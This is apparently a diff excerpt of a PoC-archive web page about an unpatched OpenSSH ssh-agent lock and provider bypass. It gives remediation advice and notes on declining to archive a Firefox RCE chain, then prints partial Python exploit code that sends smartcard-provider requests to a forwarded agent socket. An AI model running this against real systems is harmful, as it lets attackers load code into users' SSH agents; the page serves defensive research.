-<a href=/tags/no-cve/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#no-cve</a>
-<a href=/tags/local-provider-abuse/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#local-provider-abuse</a></div></div><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p><ul class="mt-2 space-y-1.5"><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-<a href=https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-<a href=https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-<a href=https://www.openbsd.org/openssh/agent-restrict.html target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.openbsd.org/openssh/agent-restrict.html</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-<a href=https://man.openbsd.org/ssh-agent.1 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://man.openbsd.org/ssh-agent.1</a></li></ul></div><div class="border-t border-zinc-200 pt-4 dark:border-mono-border"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p><a href=https://github.com/intelseclab/poc-archive/tree/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/ target=_blank rel="noopener noreferrer" class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400"><svg class="h-3.5 w-3.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37.0.0 5.37.0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57.0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925.0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18.0.0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225.0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22.0 1.605-.015 2.895-.015 3.3.0.315.225.69.825.57A12.02 12.02.0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
-intelseclab/poc-archive</a></div></div><div class="rounded border border-zinc-200 bg-zinc-50 p-3 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span class="block font-bold text-zinc-900 dark:text-white">[!] Legal notice</span><p class="mt-1 leading-relaxed">Published for defensive and educational use only. Running this against systems you do not own or have written authorisation to test is illegal.</p></div></div></aside></div><script>document.querySelectorAll(".code-copy").forEach(function(e){e.addEventListener("click",function(){var t=e.closest(".poc-code"),n=t&&t.querySelector("code");if(!n)return;navigator.clipboard.writeText(n.innerText).then(function(){var t=e.textContent;e.textContent="Copied",e.classList.add("text-emerald-600","dark:text-brand"),setTimeout(function(){e.textContent=t,e.classList.remove("text-emerald-600","dark:text-brand")},1500)}).catch(function(){e.textContent="Failed",setTimeout(function(){e.textContent="Copy"},1500)})})})</script></main><footer class="mt-16 border-t border-zinc-200 dark:border-mono-border"><div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500"><p class=font-mono>PoC Archive — research artifacts for defensive and educational use only.</p><p class=font-mono>built with <a href=https://gohugo.io class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages</p></div></footer></body></html>
+reproduced=true</code></pre>
+  </div>
+</div></div>
+        </section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="detection-amp-indicators-of-compromise" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+
+            
+            Detection &amp; Indicators of Compromise
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border">
+  <div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted">
+    <span>Output</span>
+    <button type="button" class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button>
+  </div>
+  <div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><pre class="px-3 py-2 font-mono text-[11px] leading-normal text-zinc-700 dark:text-slate-300"><code></code></pre>
+  </div>
+</div></div>
+        </section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="remediation" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
+
+            
+            Remediation
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<div class="overflow-x-auto">
+  <table>
+    
+    <thead>
+      
+      <tr>
+        
+        <th>Action</th>
+        
+        <th>Detail</th>
+        
+      </tr>
+      
+    </thead>
+    
+    <tbody>
+      
+      <tr>
+        
+        <td><strong>Patch</strong></td>
+        
+        <td>None available at time of ingestion — no CVE or vendor advisory found for this specific finding.</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Workaround</strong></td>
+        
+        <td>Avoid combining <code>ssh -A</code> (agent forwarding) with an unlocked-after-use workflow when connecting to untrusted or lower-trust hosts; consider <code>ssh -a</code> (no forwarding) or per-host <code>ForwardAgent no</code> for hosts that don&rsquo;t need it. Restrict the PKCS#11/security-key provider allowlist to the minimum necessary.</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Repair direction (per researcher)</strong></td>
+        
+        <td>Process <code>session-bind@openssh.com</code> while the agent is locked so per-socket security state is recorded before any later unlock, rather than discarding the extension request entirely at the locked gate.</td>
+        
+      </tr>
+      
+    </tbody>
+  </table>
+</div></div>
+        </section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="references" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+
+            
+            References
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<ul>
+<li><a href="https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass">Source repository — bikini/exploitarium</a></li>
+<li><a href="https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz">OpenSSH portable 10.4p1 source archive</a></li>
+<li><a href="https://www.openbsd.org/openssh/agent-restrict.html">OpenSSH agent restriction design</a></li>
+<li><a href="https://man.openbsd.org/ssh-agent.1">ssh-agent manual</a></li>
+</ul></div>
+        </section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="notes" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15.5 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V8.5z"/><path d="M15 3v6h6"/></svg>
+
+            
+            Notes
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<p>Surfaced by checking <a href="https://github.com/bikini/exploitarium">bikini/exploitarium</a> directly at the user&rsquo;s request for newest entries not yet in this archive — the rest of that repository&rsquo;s contents (37 of 39 research folders) were already covered by an earlier 2026-07-03 ingestion sweep from the same source. This was the newer of the two genuinely new entries found (both dated 2026-07-11); the other, a Firefox 152.0.5 drive-by remote-code-execution chain, was deliberately <strong>not</strong> ingested — see the companion decision recorded in this session: unlike this OpenSSH finding (which requires an already-established, agent-forwarded connection to an attacker-influenced host) and unlike every other no-CVE entry already in this archive (which had defined vendor-disclosure timelines before publication), that Firefox chain is a fully working, unpatched, single-URL-visit RCE against current stock Firefox with no evidence of vendor coordination — archiving it would mean amplifying a live weapon against currently-unpatched users rather than documenting research about a resolved issue.</p>
+<p>No CVE has been assigned to this finding as of ingestion. The repository&rsquo;s own README states research is published without prior vendor notification (&ldquo;At the time I post these, none have been reported&rdquo;), which is a real disclosure-ethics concern worth being aware of for this source generally — but this specific finding&rsquo;s narrower exploitability (requires an existing agent-forwarded SSH session to an attacker-influenced host, not a passive/drive-by vector) keeps it in line with the archive&rsquo;s existing risk bar, unlike the Firefox chain.</p>
+</div>
+        </section>
+
+    <div class="overflow-hidden rounded-lg border border-zinc-300 shadow-lg dark:border-mono-border">
+
+  
+  <div class="flex items-center gap-3 bg-zinc-800 px-3 py-2">
+    
+    <div class="flex shrink-0 items-center gap-1.5">
+      <span class="h-3 w-3 rounded-full bg-red-500"></span>
+      <span class="h-3 w-3 rounded-full bg-yellow-400"></span>
+      <span class="h-3 w-3 rounded-full bg-green-500"></span>
+    </div>
+    
+    <div class="flex flex-1 justify-center">
+      <div class="flex items-center gap-1.5 rounded-t border-x border-t border-zinc-700 bg-zinc-950 px-3 py-1">
+        <span class="h-2.5 w-2.5 shrink-0 rounded-sm" style="background-color:#3b82f6"></span>
+        <span class="font-mono text-xs text-zinc-200">poc.py</span>
+      </div>
+    </div>
+    
+    <div class="flex shrink-0 items-center gap-2">
+      <span class="rounded border border-zinc-600 bg-zinc-700/40 px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wide text-zinc-400">python</span>
+      <a href="https://raw.githubusercontent.com/intelseclab/poc-archive/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/poc.py" target="_blank" rel="noopener"
+         class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">raw</a>
+      <a href="https://github.com/intelseclab/poc-archive/blob/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/poc.py" target="_blank" rel="noopener"
+         class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">GitHub</a>
+      <a href="https://raw.githubusercontent.com/intelseclab/poc-archive/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/poc.py" download="poc.py"
+         class="rounded bg-emerald-600 px-2.5 py-1 font-mono text-xs font-medium text-white transition hover:bg-emerald-500">↓ Download</a>
+    </div>
+  </div>
+
+  <div class="poc-viewer overflow-x-auto">
+    <div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">LOCK</span> <span class="o">=</span> <span class="mi">22</span>
+</span></span><span class="line"><span class="cl"><span class="n">UNLOCK</span> <span class="o">=</span> <span class="mi">23</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADD_SMARTCARD_KEY</span> <span class="o">=</span> <span class="mi">20</span>
+</span></span><span class="line"><span class="cl"><span class="n">SUCCESS</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x06</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ssh_string</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">value</span><span class="p">))</span> <span class="o">+</span> <span class="n">value</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_exact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chunks</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">remaining</span> <span class="o">=</span> <span class="n">length</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">remaining</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">remaining</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;agent closed the connection&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">remaining</span> <span class="o">-=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">))</span> <span class="o">+</span> <span class="n">body</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="n">recv_exact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">recv_exact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sock</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">control</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">request_type</span> <span class="o">=</span> <span class="n">LOCK</span> <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">action</span> <span class="o">==</span> <span class="s2">&#34;lock&#34;</span> <span class="k">else</span> <span class="n">UNLOCK</span>
+</span></span><span class="line"><span class="cl">    <span class="n">body</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">request_type</span><span class="p">])</span> <span class="o">+</span> <span class="n">ssh_string</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">connect</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">socket</span><span class="p">)</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">reply</span> <span class="o">=</span> <span class="n">request</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">reply</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">reply</span> <span class="k">else</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">action</span><span class="si">}</span><span class="s2">_reply_type=</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span> <span class="k">if</span> <span class="n">reply</span> <span class="o">==</span> <span class="n">SUCCESS</span> <span class="k">else</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">probe</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">connect</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s2">&#34;SSH_AUTH_SOCK&#34;</span><span class="p">])</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;forwarded_socket_connected=true&#34;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">hold</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ADD_SMARTCARD_KEY</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span> <span class="o">+=</span> <span class="n">ssh_string</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provider</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span> <span class="o">+=</span> <span class="n">ssh_string</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">reply</span> <span class="o">=</span> <span class="n">request</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">reply</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">reply</span> <span class="k">else</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;provider_reply_type=</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">commands</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">add_subparsers</span><span class="p">(</span><span class="n">dest</span><span class="o">=</span><span class="s2">&#34;command&#34;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">control_parser</span> <span class="o">=</span> <span class="n">commands</span><span class="o">.</span><span class="n">add_parser</span><span class="p">(</span><span class="s2">&#34;control&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">control_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;action&#34;</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">(</span><span class="s2">&#34;lock&#34;</span><span class="p">,</span> <span class="s2">&#34;unlock&#34;</span><span class="p">))</span>
